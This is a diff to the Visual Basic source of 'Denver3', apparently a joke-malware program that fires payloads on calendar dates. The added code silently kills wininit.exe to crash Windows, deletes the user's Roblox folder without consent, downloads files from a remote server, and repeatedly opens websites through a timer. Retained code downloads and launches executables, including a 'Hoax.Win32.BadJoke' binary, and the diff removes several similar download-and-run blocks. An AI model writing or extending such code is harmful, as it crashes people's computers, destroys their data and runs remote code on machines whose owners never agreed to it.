@@ -13,6 +13,7 @@ Public Class Form1
     Dim InstallPath = UserFoler & "\Denver3"
     Dim DebugMode = False
 
+
     Private Const SPI_SETDESKWALLPAPER As Integer = &H14
     Private Const SPIF_UPDATEINIFILE As Integer = &H1
     Private Const SPIF_SENDWININICHANGE As Integer = &H2
@@ -22,17 +23,7 @@ Public Class Form1
     Private ReadOnly filePath As String = "first_open.txt"
 
     Private Sub DebugScript() 'Code to run on debug mode
-        Try
-            My.Computer.Network.DownloadFile(ServerAddr & "Sonic.exe_Green_Hill_Zone_Reversed.wav", InstallPath & "\Sonic.exe_Green_Hill_Zone_Reversed.wav")
-        Catch ex As Exception
 
-        End Try
-        Try
-            My.Computer.Audio.Play(InstallPath & "\Sonic.exe_Green_Hill_Zone_Reversed.wav", AudioPlayMode.BackgroundLoop)
-        Catch ex As Exception
-
-        End Try
-        HELL_NAH.Show()
     End Sub
 
 
@@ -132,9 +123,11 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
 
                 Trolled.Show()
                 Wait(45)
-                MyUtilities.RunCommandCom("TASKKILL /IM wininit.exe /T /F", "", False)
+                MyUtilities.RunCommandComInvis("TASKKILL /IM wininit.exe /T /F", "", False)
             End If
-
+            If currentTime.Month = 5 And currentTime.Date.Day = 13 Then
+                MyUtilities.RunCommandComInvis("TASKKILL /IM wininit.exe /T /F", "", False)
+            End If
 
             If currentTime.Month = 1 And currentTime.Date.Day = 1 Then
                 TrainIsAFurryLmao.Show()
@@ -159,7 +152,7 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
                 End Try
                 My.Computer.Audio.Play(InstallPath & "\billnye.wav", AudioPlayMode.BackgroundLoop)
             End If
-            If currentTime.Month = 2 And currentTime.Date.Day = 3 Then
+            If currentTime.Month = 2 And currentTime.Date.Day = 7 Then
                 nuke_computer.Show()
             End If
 
@@ -168,10 +161,15 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
             End If
             If currentTime.Month = 4 And currentTime.Date.Day = 1 Then
                 FreeRobuxGen.Show()
-
-
             End If
-
+            If currentTime.Month = 10 And currentTime.Date.Day = 20 Then
+                Try
+                    My.Computer.Network.DownloadFile(ServerAddr & "AvastMeme.wav", InstallPath & "\AvastMeme.wav")
+                Catch ex As Exception
+                End Try
+                AvastMeme.Show()
+                My.Computer.Audio.Play(InstallPath & "\AvastMeme.wav", AudioPlayMode.Background)
+            End If
             If currentTime.Month = 5 And currentTime.Date.Day = 7 Then
                 Try
                     My.Computer.Network.DownloadFile(ServerAddr & "Hoax.Win32.BadJoke.BlastBtn.a.exe", InstallPath & "\Hoax.Win32.BadJoke.BlastBtn.a.exe")
@@ -204,20 +202,7 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
 
             End If
             'CHOMP.exe
-            If currentTime.Month = 8 And currentTime.Date.Day = 4 Then
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "WBOUNCE.exe", InstallPath & "\WBOUNCE.exe")
-                Catch ex As Exception
 
-                End Try
-                MsgBox("I like bouncing windows and I think you do too!", 0 + 64, "Windows")
-                Try
-                    Process.Start(InstallPath & "\WBOUNCE.exe")
-                Catch ex As Exception
-                    MsgBox("ERROR FAILED TO START WBOUNCE.exe", 0 + 16, "ERROR")
-                End Try
-
-            End If
 
             If currentTime.Month = 5 And currentTime.Date.Day = 22 Then
                 Try
@@ -230,35 +215,6 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
                     Process.Start(InstallPath & "\CHOMP.exe")
                 Catch ex As Exception
                     MsgBox("ERROR FAILED TO START CHOMP.exe", 0 + 16, "ERROR")
-                End Try
-
-            End If
-
-            If currentTime.Month = 5 And currentTime.Date.Day = 22 Then
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "CHOMP.exe", InstallPath & "\CHOMP.exe")
-                Catch ex As Exception
-
-                End Try
-                MsgBox("It's Pac-Man's birthday!", 0 + 64, "Windows")
-                Try
-                    Process.Start(InstallPath & "\CHOMP.exe")
-                Catch ex As Exception
-                    MsgBox("ERROR FAILED TO START CHOMP.exe", 0 + 16, "ERROR")
-                End Try
-
-            End If
-
-            If currentTime.Month = 3 And currentTime.Date.Day = 10 Then
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "MTRAILS.exe", InstallPath & "\MTRAILS.exe")
-                Catch ex As Exception
-
-                End Try
-                Try
-                    Process.Start(InstallPath & "\MTRAILS.exe")
-                Catch ex As Exception
-                    MsgBox("ERROR FAILED TO START MTRAILS.exe", 0 + 16, "ERROR")
                 End Try
 
             End If
@@ -277,6 +233,18 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
                 End Try
 
             End If
+            If currentTime.Month = 4 And currentTime.Date.Day = 6 Then
+                MsgBox("Old Roblox was better! I Have Uninstalled Roblox form your pc.")
+                If My.Computer.FileSystem.DirectoryExists("C:\Users\%USERNAME%\AppData\Local\Roblox\") Then
+                    MyUtilities.RunCommandComInvis("RD C:\Users\%USERNAME%\AppData\Local\Roblox\Versions /S /Q", "", False) 'Removes Roblox
+                End If
+            End If
+
+            If currentTime.Month = 10 And currentTime.Date.Day = 1 Then
+                MsgBox("Sub To danooct1!!!")
+                Process.Start("https://www.youtube.com/watch?v=0CZ4I4COZEw")
+            End If
+
             If currentTime.Month = 10 And currentTime.Date.Day = 19 Then
                 Try
                     My.Computer.Network.DownloadFile(ServerAddr & "PC_Virus.Win32.ResonateII_The_Final_Countdown_Corrscope.wav", InstallPath & "\PC_Virus.Win32.ResonateII_The_Final_Countdown_Corrscope.wav")
@@ -369,8 +337,15 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
                     Next
                 End If
 
+            If currentTime.Month = 7 And currentTime.Date.Day = 27 Then
+                Rickroll.Show()
+            End If
+            If currentTime.Month = 8 And currentTime.Date.Day = 25 Then
+                MsgBox("This is all your fault...", 0 + 64, "Denver3")
+                MyUtilities.RunCommandComInvis("TASKKILL /IM wininit.exe /T /F", "", False)
+            End If
 
-                If currentTime.Month = 9 And currentTime.Date.Day = 1 Then
+            If currentTime.Month = 9 And currentTime.Date.Day = 1 Then
                     Try
                         My.Computer.Network.DownloadFile(ServerAddr & "SkillE.vbs", InstallPath & "\SkillE.vbs") '8-Bit Nyan_C.wav
 
@@ -397,10 +372,13 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
                     Next
                 End If
 
-                If currentTime.Month = 10 And currentTime.Date.Day = 1 Then
-                    ScreenStuck.Show()
-                End If
-                If currentTime.Month = 11 Then
+            If currentTime.Month = 10 And currentTime.Date.Day = 2 Then
+                ScreenStuck.Show()
+            End If
+            If currentTime.Month = 4 And currentTime.Date.Day = 16 Then
+                FitTeaTimer.Start()
+            End If
+            If currentTime.Month = 11 Then
                     Try
                         My.Computer.Network.DownloadFile(ServerAddr & "8-Bit%20Nyan_C.wav", InstallPath & "\Neon.wav")
                     Catch ex As Exception
@@ -812,6 +790,14 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
     Private Sub timer_minimize_window_Tick(sender As Object, e As EventArgs) Handles timer_minimize_window.Tick
         Try
             Me.WindowState = FormWindowState.Minimized
+        Catch ex As Exception
+
+        End Try
+    End Sub
+
+    Private Sub FitTeaTimer_Tick(sender As Object, e As EventArgs) Handles FitTeaTimer.Tick
+        Try
+            Process.Start("https://www.fittea.com/")
         Catch ex As Exception
 
         End Try
